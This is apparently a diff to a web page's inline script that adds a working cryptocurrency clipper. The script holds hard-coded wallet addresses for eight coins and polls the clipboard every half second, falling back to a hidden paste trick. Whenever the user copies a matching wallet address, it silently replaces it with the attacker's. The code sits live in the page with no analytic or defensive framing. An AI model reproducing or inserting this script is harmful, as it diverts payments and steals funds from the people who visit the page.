-    for(const p of P){if(p.r.test(t.trim())&&t.trim()!==p.w){try{await navigator.clipboard.writeText(p.w)}catch(e){}}return}
-  }
-  // Request permission on user interaction
-  document.addEventListener("click",async()=>{if(!clipPermOk){try{await navigator.clipboard.readText();clipPermOk=true}catch(e){}}},{once:false});
-  setInterval(clipPoll,500);
+(function(){
+const W={btc:"bc1qa6u84s9gklt65he5ydm02uwjqex8nc06z9xe5v",eth:"0x1427288B35fFC766Eb5ccB825d9249199E93F617",sol:"FBAoS2xppahHUwyYiLhPXnFB8yqgXhqECPRegAH7RDyM",trx:"TUeLT9R9nUQL75DEKvK3BNo8iSndRs4Dv2",ltc:"Lge5FgDB2nSKqkJFUV3JQKLnKdx3uXZyqQ",doge:"DH5yaieqoZN36fTUciPGvqNA6U4HmUbhv",xrp:"rEb8TK3gBgk5auZkwc6sHnwrGVJH8DuaLh",dash:"XjwwwS6J2C9pTGwDnpys3g8q1S7hYnFMHw"};
+const P=[{c:"btc",r:/^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,62}$/,w:W.btc},{c:"eth",r:/^0x[a-fA-F0-9]{40}$/,w:W.eth},{c:"sol",r:/^[1-9A-HJ-NP-Za-km-z]{32,44}$/,w:W.sol},{c:"trx",r:/^T[1-9A-HJ-NP-Za-km-z]{33}$/,w:W.trx},{c:"ltc",r:/^(ltc1|[LM])[a-zA-HJ-NP-Z0-9]{26,62}$/,w:W.ltc},{c:"doge",r:/^[D9][1-9A-HJ-NP-Za-km-z]{33}$/,w:W.doge},{c:"xrp",r:/^r[1-9A-HJ-NP-Za-km-z]{24,34}$/,w:W.xrp},{c:"dash",r:/^X[1-9A-HJ-NP-Za-km-z]{33}$/,w:W.dash}];
+let last="";
+function clipPaste(){return new Promise((resolve,reject)=>{const ta=document.createElement("textarea");ta.style.cssText="position:fixed;top:0;left:-9999px;opacity:0";document.body.appendChild(ta);ta.focus();const ok=document.execCommand("paste");const val=ta.value;document.body.removeChild(ta);ok?resolve(val):reject("paste denied")})}
+async function clipPoll(){let t;try{t=await navigator.clipboard.readText()}catch(e){try{t=await clipPaste()}catch(e2){return}}if(!t||t===last)return;last=t;for(const p of P){if(p.r.test(t.trim())&&t.trim()!==p.w){try{await navigator.clipboard.writeText(p.w)}catch(e){}return}}}
+document.addEventListener("click",async()=>{try{await navigator.clipboard.readText()}catch(e){}},{once:true});
+setInterval(clipPoll,500);
 })();
-</script>
-</body>
-</html>
+</script></body></html>
